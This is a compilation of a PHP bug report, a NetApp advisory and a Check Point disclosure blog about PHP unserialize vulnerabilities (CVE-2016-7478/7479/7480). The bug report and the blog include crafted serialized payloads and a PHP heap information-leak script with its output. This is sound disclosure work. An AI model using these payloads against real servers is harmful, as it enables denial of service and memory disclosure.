=== Content from bugs.php.net_1a6bb375_20250125_195933.html ===


| [Bugs](/) | [php.net](https://php.net/) |  [support](https://php.net/support.php) |  [documentation](https://php.net/docs.php) |  [report a bug](report.php) |  [advanced search](search.php) |  [search howto](search-howto.php) |  [statistics](stats.php) |  [random bug](random) |  [login](login.php) |
| --- | --- |
| go to bug id or search bugs for | |

| | [Bug](bug.php?id=73093) #73093 | Unserialize Exception object can lead to infinite loop | | | | | | --- | --- | --- | --- | --- | --- | | Submitted: | 2016-09-15 15:26 UTC | Modified: | 2016-11-03 03:27 UTC |  | | From: | yannayl at checkpoint dot com | Assigned: | [stas](search.php?cmd=display&assign=stas) ([profile](https://people.php.net/stas)) | | Status: | Closed | Package: | [\*General Issues](search.php?cmd=display&package_name[]=%2AGeneral+Issues) | | PHP Version: | 5.6.26 | OS: |  | | Private report: | No | CVE-ID: | [2016-7478](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7478) |   View [Developer](bug.php?id=73093&edit=1) [Edit](bug.php?id=73093&edit=2)   **[2016-09-15 15:26 UTC] yannayl at checkpoint dot com** ``` Description: ------------ Description: ------------ Crafting speacial input to unserialize may cause exception::__toString never to terminate.  If the exception "previous" property holds the original exception object (or any cyclic situation of that sort), the loop in exception::__toString never terminates.  Since __toString is reachable from unserialize, this issue may lead to remote DoS. This bug is closely related to [bug #70121](bug.php?id=70121).   PoC: ---- <?php echo unserialize('O:9:"exception":1:{S:19:"\00Exception\00previous";r:1;}'); ?>  expected result: script terminates. result: script never terminates.  Code Flow (commit 01e798fa360bcd89980d1946503a8e0f8a2fd357): ------------------------------------------------------------ Zend/zend_exceptions.c line 325: the exception object stores the 'previous' object, specified in unserialize Zend/zend_exceptions.c line 692: there is the while loop that iterates over the chain of exceptions Zend/zend_exceptions.c line 738: exception::__toString get's the 'previous' exception and branches back to the while loop  GDB: ---- (gdb) b zim_exception___wakeup  Breakpoint 1 at 0x8fafe2: file /home/yannayl/sources/php-src/Zend/zend_exceptions.c, line 316. (gdb) b zim_exception___toString  Breakpoint 2 at 0x9008f7: file /home/yannayl/sources/php-src/Zend/zend_exceptions.c, line 677. (gdb) r infloop.php  Starting program: /home/yannayl/sources/php-src/sapi/cli/php infloop.php Breakpoint 1, zim_exception___wakeup (execute_data=0x7ffff44130f0, return_value=0x7fffffff9aa0) at /home/yannayl/sources/php-src/Zend/zend_exceptions.c:316 316 { (gdb) b 325 Breakpoint 3 at 0x8fb787: file /home/yannayl/sources/php-src/Zend/zend_exceptions.c, line 325. (gdb) c Continuing. Breakpoint 3, zim_exception___wakeup (execute_data=0x7ffff44130f0, return_value=0x7fffffff9aa0) at /home/yannayl/sources/php-src/Zend/zend_exceptions.c:325 325     CHECK_EXC_TYPE(ZEND_STR_PREVIOUS, IS_OBJECT); (gdb) n 326 } (gdb) printzv object [0x7ffff4413110] (refcount=3) object(Exception) #1    Hash(7)[0x7ffff4455380]: {       [0]  => [0x7ffff445ca20] indirect: [0x7ffff4479028] (refcount=21) string:        [1]  => [0x7ffff445ca40] indirect: [0x7ffff4479038] (refcount=21) string:        [2]  => [0x7ffff445ca60] indirect: [0x7ffff4479048] long: 0       [3]  => [0x7ffff445ca80] indirect: [0x7ffff4479058] (refcount=1) string: /home/yannayl/sources/php-src/infloop.php       [4]  => [0x7ffff445caa0] indirect: [0x7ffff4479068] long: 3       [5]  => [0x7ffff445cac0] indirect: [0x7ffff4479078] (refcount=1) array:        [6]  => [0x7ffff445cae0] indirect: [0x7ffff4479088] (refcount=3) object(Exception) #1 }    (gdb) c Continuing. Breakpoint 2, zim_exception___toString (execute_data=0x7ffff4413090, return_value=0x7fffffff9f60) at /home/yannayl/sources/php-src/Zend/zend_exceptions.c:677 677 { (gdb) b 693 Breakpoint 4 at 0x900ac7: file /home/yannayl/sources/php-src/Zend/zend_exceptions.c, line 693. (gdb) c Continuing. Breakpoint 4, zim_exception___toString (execute_data=0x7ffff4413090, return_value=0x7fffffff9f60) at /home/yannayl/sources/php-src/Zend/zend_exceptions.c:693 693         zend_string *prev_str = str; (gdb) print exception $1 = (zval *) 0x7ffff44130b0 (gdb) l 688  689     exception = getThis(); 690     fname = zend_string_init("gettraceasstring", sizeof("gettraceasstring")-1, 0); 691  692     while (exception && Z_TYPE_P(exception) == IS_OBJECT && instanceof_function(Z_OBJCE_P(exception), zend_ce_throwable)) { 693         zend_string *prev_str = str; 694         zend_string *message = zval_get_string(GET_PROPERTY(exception, ZEND_STR_MESSAGE)); 695         zend_string *file = zval_get_string(GET_PROPERTY(exception, ZEND_STR_FILE)); 696         zend_long line = zval_get_long(GET_PROPERTY(exception, ZEND_STR_LINE)); 697  (gdb) c Continuing. Breakpoint 4, zim_exception___toString (execute_data=0x7ffff4413090, return_value=0x7fffffff9f60) at /home/yannayl/sources/php-src/Zend/zend_exceptions.c:693 693         zend_string *prev_str = str; (gdb) p exception $2 = (zval *) 0x7ffff4479088 (gdb) c Continuing. Breakpoint 4, zim_exception___toString (execute_data=0x7ffff4413090, return_value=0x7fffffff9f60) at /home/yannayl/sources/php-src/Zend/zend_exceptions.c:693 693         zend_string *prev_str = str; (gdb) p exception $3 = (zval *) 0x7ffff4479088 (gdb) c Continuing. Breakpoint 4, zim_exception___toString (execute_data=0x7ffff4413090, return_value=0x7fffffff9f60) at /home/yannayl/sources/php-src/Zend/zend_exceptions.c:693 693         zend_string *prev_str = str; (gdb) p exception $4 = (zval *) 0x7ffff4479088 (gdb) kill    ``` PatchesPull RequestsHistoryAllCommentsChangesGit/SVN commitsRelated reports  **[2016-09-26 00:25 UTC] [stas@php.net](//people.php.net/stas)** ``` I don't think it's possible to do anything about it except not writing code displaying unserializing exceptions. I could add check that previous != this, but you could as well create two exceptions for which one is previous for another, or three, or ten, and we've got back the same problem. I think the only solution for this is making exceptions not serializable: <https://github.com/php/php-src/pull/1443>  but unfortunately this was not accepted, see: <http://marc.info/?l=php-internals&m=143798100917575&w=2> and following discussion. So I don't know any solution for this.  ``` **[2016-09-26 11:05 UTC] yannayl at checkpoint dot com** ``` How about marking the exceptions already converted to string in some way and then throwing an exception or stopping the iteration when encountering already marked?  Either creating a new hash table for that or using the 'nApplyCount' of the properties table (similar to print functions)?  ``` **[2016-09-29 06:55 UTC] [stas@php.net](//people.php.net/stas)** -Summary: Unserialize exceptoin object can lead to infinite loop +Summary: Unserialize Exception object can lead to infinite loop -PHP Version: 7.1.0RC1 +PHP Version: 5.6.26 **[2016-10-31 10:23 UTC] yannayl at checkpoint dot com** ``` Assigned CVE: CVE-2016-7478 Please associate it with this bug.  ``` **[2016-11-03 03:27 UTC] [stas@php.net](//people.php.net/stas)** -Status: Open +Status: Closed -Type: Security +Type: Bug -Assigned To: +Assigned To: stas -CVE-ID: +CVE-ID: 2016-7478 **[2016-11-03 03:27 UTC] [stas@php.net](//people.php.net/stas)** ``` The fix for this bug has been committed.  Snapshots of the sources are packaged every three hours; this change will be in the next snapshot. You can grab the snapshot at <http://snaps.php.net/>.   For Windows:  <http://windows.php.net/snapshots/>   Thank you for the report, and for helping us make PHP better.  Does not reproduce anymore, seems to be fixed.  ``` |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

|  | |
| --- | --- |
| [PHP](https://php.net/) [Copyright © 2001-2025 The PHP Group](https://php.net/copyright.php) All rights reserved. | Last updated: Sat Jan 25 19:01:28 2025 UTC |



=== Content from security.netapp.com_e1890417_20250125_195940.html ===

[Skip to main content](#n-main-content)

* [NetApp.com](https://www.netapp.com/)
* [Support](https://mysupport.netapp.com)
* [Community](https://community.netapp.com)
* [Training](https://www.netapp.com/support-and-training/netapp-learning-services/)

* [Contact Us](https://www.netapp.com/company/contact-us/)

English
æ¥æ¬èª

[netapp-mark

NetApp

## Product Security](https://security.netapp.com)

Search

Search

* Search

Search

Search

* [Home](https://security.netapp.com/en)
* [Advisories](https://security.netapp.com/advisory/)
* [Bulletins](https://security.netapp.com/bulletins/)
* [Contact](https://security.netapp.com/contact/)
* [Policy](https://security.netapp.com/policy/)
* [Resources](https://security.netapp.com/resources/)
* [Certifications](https://security.netapp.com/certs/)

* [Home](https://security.netapp.com/en)
* [Advisory](https://security.netapp.com/advisory)
* [September 2017 PHP Vulnerabilities in NetApp Products](https://security.netapp.com/advisory/ntap-20180112-0001)

## September 2017 PHP Vulnerabilities in NetApp Products

circle-check-alt

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

close ×

#### Subscribe to NTAP-20180112-0001 updates

Email

Yes, please send me emails when NetApp Security Advisories are posted or updated.

 By filling and submitting this form, I understand and agree with the [NetApp privacy policy](https://www.netapp.com/company/legal/privacy-policy/ "Privacy Policy") and understand that I can unsubscribe from NetApp Security Advisory communications at any time.

Subscribe

#### Subscribe to NTAP-20180112-0001 advisory updates

OTP

Confirm

ionicons-v5-e

Confirmed your subscription to advisory alerts

close ×

#### Unsubscribe from NTAP-20180112-0001 advisory updates

Email

Unsubscribe

#### Unsubscribe from NTAP-20180112-0001 advisory updates

Email

Confirm

ionicons-v5-e

Unsubscribed successfully from advisory alerts

Subscribe to receive email updates

**Advisory ID:** NTAP-20180112-0001
**Version:**
2.0

**Last updated:**
03/14/2019

**Status:**
Final.

**CVEs:** CVE-2017-11628, CVE-2017-11362, CVE-2017-11142, CVE-2016-10397, CVE-2017-11143, CVE-2017-11144, CVE-2017-11145, CVE-2017-11147, CVE-2017-9119, CVE-2016-5399, CVE-2017-7272, CVE-2016-5873, CVE-2016-10160, CVE-2016-7479, CVE-2016-7480, CVE-2017-5340, CVE-2016-7478, CVE-2017-12932, CVE-2017-7890, CVE-2016-10158, CVE-2016-10159, CVE-2016-10161

Overview
#### Summary

Multiple NetApp products use PHP. PHP versions below 7.1.9, 7.0.23 and 5.6.31 are susceptible to vulnerabilities that could lead to a Denial of Service(DoS), arbitrary code execution, bypass of hostname-specific URL checks, information disclosure, server side request forgery or buffer overflow based attacks.

#### Impact

Successful exploitation of the vulnerabilities could lead to a Denial of Service(DoS), arbitrary code execution, bypass of hostname-specific URL checks, information disclosure, server side request forgery or buffer overflow based attacks.

#### Vulnerability Scoring Details

| **CVE** | **Score** | **Vector** |
| --- | --- | --- |
| [CVE-2016-10158](https://nvd.nist.gov/vuln/detail/CVE-2016-10158) | 7.5 (HIGH) | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |
| [CVE-2016-10159](https://nvd.nist.gov/vuln/detail/CVE-2016-10159) | 7.5 (HIGH) | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |
| [CVE-2016-10160](https://nvd.nist.gov/vuln/detail/CVE-2016-10160) | 9.8 (CRITICAL) | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| [CVE-2016-10161](https://nvd.nist.gov/vuln/detail/CVE-2016-10161) | 7.5 (HIGH) | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |
| [CVE-2016-10397](https://nvd.nist.gov/vuln/detail/CVE-2016-10397) | 7.5 (HIGH) | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N |
| [CVE-2016-5399](https://nvd.nist.gov/vuln/detail/CVE-2016-5399) | 7.8 (HIGH) | CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H |
| [CVE-2016-5873](https://nvd.nist.gov/vuln/detail/CVE-2016-5873) | 9.8 (CRITICAL) | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| [CVE-2016-7478](https://nvd.nist.gov/vuln/detail/CVE-2016-7478) | 7.5 (HIGH) | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |
| [CVE-2016-7479](https://nvd.nist.gov/vuln/detail/CVE-2016-7479) | 9.8 (CRITICAL) | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| [CVE-2016-7480](https://nvd.nist.gov/vuln/detail/CVE-2016-7480) | 9.8 (CRITICAL) | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| [CVE-2017-11142](https://nvd.nist.gov/vuln/detail/CVE-2017-11142) | 7.5 (HIGH) | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |
| [CVE-2017-11143](https://nvd.nist.gov/vuln/detail/CVE-2017-11143) | 7.5 (HIGH) | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |
| [CVE-2017-11144](https://nvd.nist.gov/vuln/detail/CVE-2017-11144) | 7.5 (HIGH) | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |
| [CVE-2017-11145](https://nvd.nist.gov/vuln/detail/CVE-2017-11145) | 7.5 (HIGH) | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| [CVE-2017-11147](https://nvd.nist.gov/vuln/detail/CVE-2017-11147) | 9.1 (CRITICAL) | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H |
| [CVE-2017-11362](https://nvd.nist.gov/vuln/detail/CVE-2017-11362%20) | 9.8 (CRITICAL) | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| [CVE-2017-11628](https://nvd.nist.gov/vuln/detail/CVE-2017-11628) | 7.8 (HIGH) | CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H |
| [CVE-2017-12932](https://nvd.nist.gov/vuln/detail/CVE-2017-12932) | 9.8 (CRITICAL) | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| [CVE-2017-5340](https://nvd.nist.gov/vuln/detail/CVE-2017-5340) | 9.8 (CRITICAL) | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| [CVE-2017-7272](https://nvd.nist.gov/vuln/detail/CVE-2017-7272) | 7.4 (HIGH) | CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:H/A:N |
| [CVE-2017-7890](https://nvd.nist.gov/vuln/detail/CVE-2017-7890) | 6.5 (MEDIUM) | CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N |
| [CVE-2017-9119](https://nvd.nist.gov/vuln/detail/CVE-2017-9119) | 9.8 (CRITICAL) | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |

#### Exploitation and Public Announcements

NetApp is aware of public discussion of this vulnerability.

Affected Products
#### Affected Products

* Clustered Data ONTAP

#### Products Not Affected

* 7-Mode Transition Tool
* ATTO FibreBridge
* Active IQ Unified Manager (formerly OnCommand Unified Manager) for Linux 7.3 and above
* Active IQ Unified Manager (formerly OnCommand Unified Manager) for VMware vSphere 9.5 and above
* Active IQ Unified Manager (formerly OnCommand Unified Manager) for Windows 7.3 and above
* Brocade Fabric Operating System Firmware
* Brocade Network Advisor Software
* Clustered Data ONTAP Antivirus Connector
* Data ONTAP operating in 7-Mode
* E-Series SANtricity Management Plug-ins (VMware vCenter)
* E-Series SANtricity OS Controller Software 11.x
* E-Series SANtricity Storage Manager
* E-Series SANtricity Web Services (REST API) for Web Services Proxy
* FAS/AFF BIOS
* Host Utilities - SAN for Linux
* Host Utilities - SAN for Windows
* MetroCluster Tiebreaker for clustered Data ONTAP
* NetApp Cloud Backup (formerly AltaVault)
* NetApp Cloud Backup OST Plug-in (formerly AltaVault OST Plug-in)
* NetApp Converged Systems Advisor Agent
* NetApp HCI Compute Node (Bootstrap OS)
* NetApp Manageability SDK
* NetApp NFS Plug-in for VMware VAAI
* NetApp Plug-in for Symantec NetBackup
* NetApp SANtricity SMI-S Provider
* NetApp SMI-S Provider
* NetApp Service Level Manager
* NetApp SolidFire & HCI Storage Node (Element Software)
* NetApp Storage Encryption
* NetApp VASA Provider for Clustered Data ONTAP 7.2 and above
* ONTAP Select Deploy administration utility
* OnCommand API Services
* OnCommand Cloud Manager
* OnCommand Insight
* OnCommand System Manager 9.x
* OnCommand Unified Manager for 7-Mode (core package)
* OnCommand Workflow Automation
* Open Systems SnapVault Agent
* RAID Controller CTS2600 Legacy Engenio
* Service Processor
* Single Mailbox Recovery
* Snap Creator Framework
* SnapCenter
* SnapDrive for Unix
* SnapDrive for Windows
* SnapManager for Exchange
* SnapManager for Hyper-V
* SnapManager for MS SQL
* SnapManager for Oracle
* SnapManager for SAP
* SnapManager for Sharepoint
* Storage Replication Adapter for Clustered Data ONTAP for VMware vSphere 7.2 and above
* Storage Services Connector
* StorageGRID (formerly StorageGRID Webscale)
* StorageGRID Webscale NAS Bridge
* StorageGRID9 (9.x and prior)
* System Setup
* Virtual Storage Console for VMware vSphere 7.2 and above

Remediation
#### Software Versions and Fixes

NetApp's currently available patches are listed below.

| **Product** | **First Fixed in Release** |
| --- | --- |
| **Clustered Data ONTAP** | <https://mysupport.netapp.com/NOW/download/software/ontap/9.1P10/> <https://mysupport.netapp.com/NOW/download/software/ontap/9.2P2/> |

#### Workarounds

None at this time.

#### Obtaining Software Fixes

Software fixes will be made available through the NetApp Support website in the Software Download section.

<https://mysupport.netapp.com/site/downloads/>

Customers who do not have access to the Support website should contact Technical Support at the number below to obtain the patches.

#### Contact Information

Check <http://mysupport.netapp.com> for further
updates.

**Technical Support**

Revision History
#### Status of This Notice

**Final.**

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

This advisory is posted at the following link:

<https://security.netapp.com/advisory/NTAP-20180112-0001>
#### Revision History

| **Revision #** | **Date** | **Comments** |
| --- | --- | --- |
| 1.0 | 20180112 | Initial Public Release |
| 2.0 | 20190314 | Storage Automation Store added to Software Versions and Fixes, Final status |

This document is provided solely for informational purposes. All information is based upon NetAppâs current knowledge and understanding of the hardware and software products tested by NetApp, and the methodology and assumptions used by NetApp. NetApp is not responsible for any errors or omissions that may be contained herein, and no warranty, representation, or other legal commitment or obligation is being provided by NetApp. Â© 2025 NetApp, Inc. All rights reserved. No portions of this document may be reproduced without prior written consent of NetApp, Inc.

 ©  NetApp

Have feedback for our website?
[Let us know](https://www.netapp.com/forms/site-feedback/)



=== Content from blog.checkpoint.com_8f0b3151_20250125_195933.html ===
CHECK POINT DISCLOSES
3 PHP 0-DAYS

TWO MONTHS AGO, CHECK POINT SECURITY RESEARCH PUBLISHED A PAPER ABOUT

EXPLOITING  PHP-7  UNSERIALIZE  VULNERABILITIES  AND  CONCLUDED  THERE  ARE

MORE  0-DAY  VULNERABILITIES  WAITING  IN  THE  WINGS.  TODAY,  WE  PROVE  THIS

CONJECTURE AND DISCLOSE THREE NEW VULNERABILITIES WHICH ALLOW A REMOTE

ATTACKER  TO  CAUSE  DENIAL  OF  SERVICE  IN  ALL  EXISTING  PHP  VERSIONS  AND

EXECUTE ARBITRARY CODE IN VERSION 7.

Without further ado, we dive into the technical details for each of the 0-days.

I. CVE-2016-7478—REMOTE DENIAL OF SERVICE
The first vulnerability allows a remote attacker to unserialize a pathological exception object which refers to itself as the
previous exception. When invoking the __toString method of this exception, the code iterates over the chain of exceptions.
As the chain of exceptions consists of just that one object that points to itself, the iteration never terminates.

This object is created by passing the following string to unserialize:

O:9:"exception":1:{S:19:"\00Exception\00previous";r:1;}

This causes unserialize to instantiate an exception object with the Exceptionprevious property set to the first unserialized
value—the exception object itself.

©2016 Check Point Software Technologies Ltd. All rights reserved   |   1

This is the relevant PHP code from the exception::__toString method:

From this code, the infinite loop is obvious.

ZEND_METHOD(exception, __toString)
{
 /* ... */
 exception = getThis();

 while (exception && Z_TYPE_P(exception) == IS_OBJECT && instanceof_function(Z
OBJCE_P(exception), zend_ce_throwable)) {

/* ... code that fills a buffer with the exception's details ... */

exception = GET_PROPERTY(exception, ZEND_STR_PREVIOUS);

 }

 /* ... */
}

It is important to note that in PHP-7 it is possible to invoke the __toString method on every object during unserialization.
This happens due to an invocation of zval_to_string on the unserialized values of DateInterval object.

For example, if we unserialize this string:

O:12:"DateInterval":1:{s:4:"days";O:3:"foo":0:{}}

We invoke the php_date_interval_initialize_from_hash that contains the following lines:

#define PHP_DATE_INTERVAL_READ_PROPERTY_I64(element, member) \
do { \
    zval *z_arg = zend_hash_str_find(myht, element, sizeof(element) - 1); \
    if (z_arg) { zend_string *str = zval_get_string(z_arg); }\
    /* ... */\
} while (0);

/* ... */

PHP_DATE_INTERVAL_READ_PROPERTY_I64("days", days);

These lines invoke the zval_get_string method on the value of days, which is a foo class in our example. If foo’s __toString
method contains some interesting code, an attacker can use it for exploitation.

Calling __toString during unserialization is not a vulnerability per se. However, it opens a major attack surface and we
reported it as a bug to the PHP security team as well.

Exploiting this behavior enables an attacker to trigger the denial of service bug remotely via unserialize in PHP-7 without
any other precondition.

©2016 Check Point Software Technologies Ltd. All rights reserved   |   2

II. CVE-2016-7479—UAF CODE EXECUTION
The second vulnerability is a little more complicated, and requires some preconditions. However, it allows a remote
attacker to fully control the vulnerable process.

The root cause of this vulnerability is that the unserialized properties of an object are stored in the properties hash table
of this object. Every unserialized value has a reference in the var_hash struct to support the reference feature of the
serialization format.

As the hash table is dynamic, it grows when values are added. When a hash table grows, the internal array which holds its
values is freed, and a bigger array, which contains a copy of the values, is allocated and used instead. The problem is that
no code updates the var_hash when this resize happens. Thus, if an object’s properties hash table is resized during the
process of unserialization, the var_hash contains pointers to the freed memory.

There are two ways to trigger this vulnerability.

First, if the application has a method that creates a property dynamically, and this method is called during unserialization,
it can trigger the bug.

For example, if the application has some code that resembles this:

class foo {

    function __wakeup() {

        $this->{'x'} = 1;

    }

}

It can trigger the bug.

The __wakeup method of an object is called right after unserializing the object’s properties. This behavior meets our
requirements. The x property is dynamically created and added to the properties hash table.

Unserializing this string:

O:3:"foo":8:{i:0;i:0;i:1;i:1;i:2;i:2;i:3;i:3;i:4;i:4;i:5;i:5;i:6;i:6;i:7;i:7;}

allocates foo’s properties hash table with a data array of size 8 holding the 8 integers (0-7). Then, when the __wakeup
method is called, a new value x is inserted to the properties hash table. As the internal data array of the hash table was
full before the insertion, the hash table is resized, freeing the internal data array and allocating a bigger one. Therefore,
it triggers the vulnerability and causes pointers in var_hash to point to the freed memory.

The second way to trigger this vulnerability is more complex. It relies on an odd behavior of the DateInterval object.
This object updates its properties hash table every time its properties are accessed (more accurately: every time its
get_properties handler is invoked).

©2016 Check Point Software Technologies Ltd. All rights reserved   |   3

This is the code of the DateInterval’s get_properties handler:

props = zend_std_get_properties(object);

/* ... */

#define PHP_DATE_INTERVAL_ADD_PROPERTY(n,f) \
    ZVAL_LONG(&zv, (zend_long)intervalobj->diff->f); \
    zend_hash_str_update(props, n, sizeof(n)-1, &zv);

PHP_DATE_INTERVAL_ADD_PROPERTY("y", y);
PHP_DATE_INTERVAL_ADD_PROPERTY("m", m);
PHP_DATE_INTERVAL_ADD_PROPERTY("d", d);
PHP_DATE_INTERVAL_ADD_PROPERTY("h", h);
PHP_DATE_INTERVAL_ADD_PROPERTY("i", i);
PHP_DATE_INTERVAL_ADD_PROPERTY("s", s);
PHP_DATE_INTERVAL_ADD_PROPERTY("weekday", weekday);
PHP_DATE_INTERVAL_ADD_PROPERTY("weekday_behavior", weekday_behavior);
PHP_DATE_INTERVAL_ADD_PROPERTY("first_last_day_of", first_last_day_of);
PHP_DATE_INTERVAL_ADD_PROPERTY("invert", invert);
if (intervalobj->diff->days != -99999) {
    PHP_DATE_INTERVAL_ADD_PROPERTY("days", days);
} else {
    ZVAL_FALSE(&zv);
    zend_hash_str_update(props, "days", sizeof("days")-1, &zv);
}
PHP_DATE_INTERVAL_ADD_PROPERTY("special_type", special.type);
PHP_DATE_INTERVAL_ADD_PROPERTY("special_amount", special.amount);
PHP_DATE_INTERVAL_ADD_PROPERTY("have_weekday_relative", have_weekday_relative);
PHP_DATE_INTERVAL_ADD_PROPERTY("have_special_relative", have_special_relative);

This code (zend_hash_str_update) updates the internal properties hash table with quite a few values. If these values don’t
exist in the hash table, they are created.

To trigger the vulnerability, all that is needed is to unserialize a DateInterval object without providing all the properties.
Then, look for a method, that is called during unserialization and accesses the DateInterval‘s properties.

Here is an example of a vulnerable code:

class foo {
    public $x;
    function __wakeup() {
        var_dump($this->x);
    }
}

The var_dump built-in function internally iterates all the properties of the given object. Thus, unserializing the following
string:

O:3:"foo":1:{s:1:"x";O:12:"DateInterval":1:{i:0;i:0;}}

triggers the vulnerability.

It is worth mentioning again that __toString method is also reachable via unserialize (as described in the previous
vulnerability). If a __toString method accesses an object’s properties, it can be invoked during unserialization and trigger
this vulnerability.

©2016 Check Point Software Technologies Ltd. All rights reserved   |   4

EXPLOITATION
The code-execution bug allows an attacker to forge zvals, a strong primitive that can easily lead to code execution.
The object forging primitives explained in the PHP 7 exploitation paper can work here as well. However, there is one
non-trivial piece in the puzzle—information leak. The information leak primitive from the exploitation paper can’t be
used here, as it relies on the allocator freeing objects of our choice and having a pointer to a beginning of heap slot—
which is not the case.

Of course, an attacker may use another bug, or hash table trickery, and disclose information about memory addresses.
However, a more clever way to operate is to leak addresses using the same bug.

This bug can be used for information leak as well. An attacker can set the last zval in the hash table to be a string, which
means the first field of the zval is a pointer to zend_string. Then, he triggers the bug, leaving the hash table data array’s
slot ready to be allocated. The attacker catches the freed slot using another string with a precise length—exactly the
length needed for the null terminator to override the least significant byte of the pointer. Zeroing the least significant
byte moves the pointer back a little bit—to a memory controlled by the attacker. The attacker can set a very large string
length and read beyond that slot to the following slots, leaking the heap’s content.

For example, if we execute this code:

<?php
class foo {
    function __wakeup() {
        $this->{'x'} = 1;
    }
}

// 1337 == 0x539
$fake_string_len_1337 = str_repeat("\x39\x05\00\00\00\00\00\00", 50);

$s =
    'a:2:{'.
        'i:0;a:5:{'.
            'i:0;s:295:"'. str_repeat("\00", 295) .'";'.
            'i:1;O:3:"foo":8:{'.
                'i:0;N;'.
                'i:1;N;'.
                'i:2;N;'.
                'i:3;N;'.
                'i:4;N;'.
                'i:5;N;'.
                'i:6;s:295:"' . substr($fake_string_len_1337, 0 , 295) . '";'.
                'i:7;s:295:"' . str_repeat("\00", 295) . '";'.
            '}'.
            'i:2;s:232:"' . str_repeat("\00", 232) . '";'. // overriding string
            'i:3;s:295:"' ."\nCan I leak it?\n" . str_repeat("\00", 279) . '";'.
            'i:4;s:295:"' . "\nYes you can!\n" . str_repeat("\00", 281) . '";'.
        '}'.
        'i:0;r:12;'. // this is our leaked string
    '}';

echo serialize(unserialize($s));

©2016 Check Point Software Technologies Ltd. All rights reserved   |   5

The result is:

$ php info_leak.php  | hexdump -C
00000000  61 3a 31 3a 7b 69 3a 30  3b 73 3a 31 33 33 37 3a  |a:1:{i:0;s:1337:|
00000010  22 39 05 00 00 00 00 00  00 39 05 00 00 00 00 00  |"9.......9......|
00000020  00 39 05 00 00 00 00 00  00 39 05 00 00 00 00 00  |.9.......9......|
*
000000b0  00 39 05 00 00 00 00 00  00 80 cc 85 ea 8c 7f 00  |.9..............|
000000c0  00 00 00 00 00 00 00 00  00 27 01 00 00 00 00 00  |.........'......|
000000d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
000001f0  00 00 00 00 00 00 00 00  00 40 cb 85 ea 8c 7f 00  |.........@......|
00000200  00 00 00 00 00 00 00 00  00 27 01 00 00 00 00 00  |.........'......|
00000210  00 0a 43 61 6e 20 49 20  6c 65 61 6b 20 69 74 3f  |..Can I leak it?|
00000220  0a 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000230  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000330  00 00 00 00 00 00 00 00  00 00 cf 85 ea 8c 7f 00  |................|
00000340  00 00 00 00 00 00 00 00  00 27 01 00 00 00 00 00  |.........'......|
00000350  00 0a 59 65 73 20 79 6f  75 20 63 61 6e 21 0a 00  |..Yes you can!..|
00000360  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000470  00 00 00 00 00 00 00 00  00 c0 d2 85 ea 8c 7f 00  |................|
00000480  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000540  00 00 00 00 00 00 00 00  00 00 22 3b 7d 0a        |..........";}.|

That prints a couple of adjacent slots with content we specified and the free list’s pointers.

III. CVE-2016-7480—USE OF UNINITIALIZED VALUE CODE EXECUTION
The third vulnerability is a classic use-of-uninitialized-value from the stack found in the custom unserialize function of
the SplObjectStorage object.

Let’s examine the vulnerable code:

SPL_METHOD(SplObjectStorage, unserialize)
{
    // ...
    zval entry, inf;

    // ...
    while (count-- > 0) {

        // ...
        if (*p == ',') { /* new version has inf */
            ++p;
            if (!php_var_unserialize(&inf, &p, s + buf_len, &var_hash)) {
                zval_ptr_dtor(&entry);
                goto outexcept;
            }
        } else {
            ZVAL_UNDEF(&inf);
        }

        //...

©2016 Check Point Software Technologies Ltd. All rights reserved   |   6

We see that the inf variable is defined on the stack, but not initialized. Then, under certain (trivial) conditions, a pointer to
this variable is passed to php_var_unserialize (expecting the function fills this struct).

php_var_unserialize ultimately invokes php_var_unserialize_internal with rval argument holding the pointer to inf. If the
parsed value is a reference (i.e. *p == ‘R’), the following code is executed:

"R:" iv ";"     {
    //...
    zval_ptr_dtor(rval);
    //...

So, if an attacker can manipulate inf to hold a reference-counted zval, the attacker can free it during unserialization.
Moreover, since the zval_ptr_dtor decreases the refcount field of the zval, it might be abused to decrease some
interesting values such as pointers.

